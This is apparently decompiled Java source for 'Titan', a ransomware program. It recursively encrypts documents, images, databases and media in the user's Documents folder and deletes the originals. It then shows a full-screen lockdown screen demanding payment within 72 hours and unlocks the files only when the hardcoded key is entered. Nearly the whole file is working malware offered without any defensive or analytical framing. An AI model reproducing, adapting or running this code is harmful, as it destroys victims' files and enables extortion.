package com.company;

import java.awt.Color;
import java.awt.Cursor;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import javax.swing.BorderFactory;
import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.Timer;
import org.apache.commons.p000io.FileUtils;

/* loaded from: Titan.jar:com/company/Main.class */
public class Main {

    /* renamed from: os */
    private static EnumC0003OS f0os = null;
    public static String key = "Optimus_Was_here";

    /* renamed from: com.company.Main$OS */
    /* loaded from: Titan.jar:com/company/Main$OS.class */
    public enum EnumC0003OS {
        WINDOWS,
        LINUX,
        MAC,
        SOLARIS,
        ANDROID,
        CHROMEOS
    }

    public static void main(String[] args) {
        FileFinder();
        Warning();
    }

    public static void FileFinder() {
        switch (getOs()) {
            case WINDOWS:
                System.out.println("The victim is Windows");
                break;
            case LINUX:
                System.out.println("The Victim is Linux");
                break;
            case MAC:
                System.out.println("The victim machine is Mac OS");
                break;
            case ANDROID:
                System.out.println("The victim is Android");
            case CHROMEOS:
                System.out.println("The victim is ChromeOs");
                break;
        }
        ArrayList<String> CriticalPathList = new ArrayList<>();
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        Iterator<String> it = CriticalPathList.iterator();
        while (it.hasNext()) {
            String TargetDirectory = it.next();
            File root = new File(TargetDirectory);
            try {
                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "mkv", "mp4", "mp3", "avi", "sql", "jpeg", "cert", "docx", "odt"};
                Collection files = FileUtils.listFiles(root, extensions, true);
                for (Object o : files) {
                    File file = (File) o;
                    Encryptor(file.getAbsolutePath());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void Encryptor(String TargetFilePath) {
        File targetFile = new File(TargetFilePath);
        File encryptedTargetFile = new File(TargetFilePath + ".encrypted");
        try {
            CryptoUtils.encrypt(key, targetFile, encryptedTargetFile);
        } catch (CryptoException ex) {
            ex.printStackTrace();
        }
        targetFile.delete();
    }

    public static void Warning() {
        JFrame frame = new JFrame("▓▓▒░  SYSTEM BREACH ░▒▓▓");
        frame.setDefaultCloseOperation(3);
        frame.setUndecorated(true);
        frame.setExtendedState(6);
        frame.getContentPane().setBackground(Color.BLACK);
        JPanel matrixPanel = new JPanel() { // from class: com.company.Main.1
            final Random random = new Random();
            final List<String> binaryTrails = new ArrayList();

            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                Graphics2D g2d = (Graphics2D) g;
                g2d.setColor(new Color(0, 32, 0));
                g2d.fillRect(0, 0, getWidth(), getHeight());
                g2d.setFont(new Font("Monospaced", 1, 20));
                for (int i = 0; i < 50; i++) {
                    int x = this.random.nextInt(getWidth());
                    int y = this.random.nextInt(getHeight());
                    g2d.setColor(new Color(0, 255 - this.random.nextInt(100), 0, 150 + this.random.nextInt(105)));
                    g2d.drawString(Integer.toBinaryString(this.random.nextInt(256)), x, y);
                }
            }
        };
        matrixPanel.setLayout(new GridBagLayout());
        JPanel mainPanel = new JPanel();
        mainPanel.setOpaque(false);
        mainPanel.setLayout(new BoxLayout(mainPanel, 1));
        mainPanel.setBorder(BorderFactory.createLineBorder(new Color(0, 255, 0), 5));
        JLabel title = new JLabel("▓▓▒░ ENCRYPTION LOCKDOWN ░▒▓▓");
        title.setFont(new Font("OCR A Extended", 1, 48));
        title.setForeground(new Color(0, 255, 0));
        title.setAlignmentX(0.5f);
        Timer glitchTimer = new Timer(100, e -> {
            title.setLocation(new Random().nextInt(5) - 2, new Random().nextInt(5) - 2);
            title.setForeground(new Color(0, 255 - new Random().nextInt(50), 0));
        });
        glitchTimer.start();
        JLabel asciiArt = new JLabel("<html><pre style='color:#0F0;font-family:Monospaced'>████████╗██╗████████╗ █████╗ ███╗   ██╗<br/>╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║<br/>   ██║   ██║   ██║   ███████║██╔██╗ ██║<br/>   ██║   ██║   ██║   ██╔══██║██║╚██╗██║<br/>   ██║   ██║   ██║   ██║  ██║██║ ╚████║<br/>   ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝<br/><br/></pre></html>");
        asciiArt.setAlignmentX(0.5f);
        JTextField keyField = new JTextField(20);
        keyField.setMaximumSize(new Dimension(600, 40));
        keyField.setFont(new Font("OCR A Extended", 1, 24));
        keyField.setForeground(Color.GREEN);
        keyField.setBackground(new Color(0, 20, 0));
        keyField.setCaretColor(Color.GREEN);
        keyField.setBorder(BorderFactory.createCompoundBorder(BorderFactory.createLineBorder(new Color(0, 255, 0), 2), BorderFactory.createEmptyBorder(5, 10, 5, 10)));
        final JButton submit = new JButton("[ INITIATE DECRYPTION ]");
        submit.setFont(new Font("OCR A Extended", 1, 24));
        submit.setForeground(Color.BLACK);
        submit.setBackground(new Color(0, 255, 0));
        submit.setBorder(BorderFactory.createCompoundBorder(BorderFactory.createLineBorder(new Color(0, 255, 0), 3), BorderFactory.createEmptyBorder(10, 25, 10, 25)));
        submit.setFocusPainted(false);
        submit.setCursor(Cursor.getPredefinedCursor(12));
        submit.addMouseListener(new MouseAdapter() { // from class: com.company.Main.2
            public void mouseEntered(MouseEvent e2) {
                submit.setBackground(new Color(50, 255, 50));
            }

            public void mouseExited(MouseEvent e2) {
                submit.setBackground(new Color(0, 255, 0));
            }
        });
        JLabel status = new JLabel("");
        status.setFont(new Font("OCR A Extended", 1, 18));
        status.setForeground(Color.RED);
        status.setAlignmentX(0.5f);
        JLabel victimMessage = new JLabel("▓▓▒░ 72 HOURS REMAINING - PAYMENT REQUIRED ░▒▓▓");
        victimMessage.setFont(new Font("OCR A Extended", 0, 16));
        victimMessage.setForeground(new Color(0, 255, 255));
        victimMessage.setAlignmentX(0.5f);
        Timer glowTimer = new Timer(2000, e2 -> {
            victimMessage.setForeground(new Color(new Random().nextInt(100), 200 + new Random().nextInt(55), 200 + new Random().nextInt(55)));
        });
        glowTimer.start();
        Timer pulseTimer = new Timer(50, e3 -> {
            float alpha = (System.currentTimeMillis() % 1000) / 1000.0f;
            status.setForeground(new Color(1.0f, 0.0f, 0.0f, 0.5f + (alpha * 0.5f)));
        });
        submit.addActionListener(e4 -> {
            String inputKey = keyField.getText();
            if (inputKey.equals(key)) {
                pulseTimer.stop();
                status.setText("░░ DECRYPTION INITIATED ░░");
                frame.dispose();
                FileFinder("encrypted");
                return;
            }
            status.setText("░░ INTRUSION DETECTED - KEY INVALID ░░");
            pulseTimer.start();
            new Timer(10, new ActionListener() { // from class: com.company.Main.3
                int count = 0;
                final int originalX;

                {
                    this.originalX = keyField.getX();
                }

                public void actionPerformed(ActionEvent ae) {
                    if (this.count < 10) {
                        keyField.setLocation(this.originalX + (this.count % 2 == 0 ? 5 : -5), keyField.getY());
                        this.count++;
                    } else {
                        ((Timer) ae.getSource()).stop();
                        keyField.setLocation(this.originalX, keyField.getY());
                    }
                }
            }).start();
        });
        mainPanel.add(Box.createVerticalGlue());
        mainPanel.add(title);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));
        mainPanel.add(asciiArt);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 40)));
        mainPanel.add(keyField);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 30)));
        mainPanel.add(submit);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));
        mainPanel.add(status);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 40)));
        mainPanel.add(victimMessage);
        mainPanel.add(Box.createVerticalGlue());
        matrixPanel.add(mainPanel);
        frame.setContentPane(matrixPanel);
        new Timer(100, e5 -> {
            matrixPanel.repaint();
        }).start();
        frame.setVisible(true);
        frame.toFront();
        frame.repaint();
    }

    public static void FileFinder(String ext) {
        switch (getOs()) {
            case WINDOWS:
                System.out.println("The victim is Windows");
                break;
            case LINUX:
                System.out.println("The Victim is Linux");
                break;
            case MAC:
                System.out.println("the victim machine is Mac OS");
                break;
        }
        ArrayList<String> CriticalPathList = new ArrayList<>();
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        Iterator<String> it = CriticalPathList.iterator();
        while (it.hasNext()) {
            String TargetDirectory = it.next();
            File root = new File(TargetDirectory);
            try {
                String[] extensions = {ext};
                Collection files = FileUtils.listFiles(root, extensions, true);
                for (Object o : files) {
                    File file = (File) o;
                    Decryptor(file.getAbsolutePath());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void Decryptor(String EncryptedFilePath) {
        File targetFile = new File(EncryptedFilePath);
        File decryptedTargetFile = new File(EncryptedFilePath + ".decrypted");
        try {
            CryptoUtils.decrypt(key, targetFile, decryptedTargetFile);
            String originalFileName = EncryptedFilePath;
            if (originalFileName.endsWith(".encrypted")) {
                originalFileName = originalFileName.substring(0, originalFileName.length() - ".encrypted".length());
            }
            File finalFile = new File(originalFileName);
            if (decryptedTargetFile.renameTo(finalFile)) {
                System.out.println("File successfully decrypted and renamed to: " + finalFile.getName());
            } else {
                System.err.println("Failed to rename decrypted file.");
            }
            targetFile.delete();
        } catch (CryptoException ex) {
            ex.printStackTrace();
        }
    }

    public static EnumC0003OS getOs() {
        if (f0os == null) {
            String operSys = System.getProperty("os.name").toLowerCase();
            if (operSys.toLowerCase().contains("win")) {
                f0os = EnumC0003OS.WINDOWS;
            } else if (operSys.toLowerCase().contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                f0os = EnumC0003OS.LINUX;
            } else if (operSys.toLowerCase().contains("mac")) {
                f0os = EnumC0003OS.MAC;
            } else if (operSys.toLowerCase().contains("sunos")) {
                f0os = EnumC0003OS.SOLARIS;
            } else if (operSys.toLowerCase().contains("android")) {
                f0os = EnumC0003OS.ANDROID;
            } else if (operSys.toLowerCase().contains("chromeos")) {
                f0os = EnumC0003OS.CHROMEOS;
            }
        }
        return f0os;
    }
}
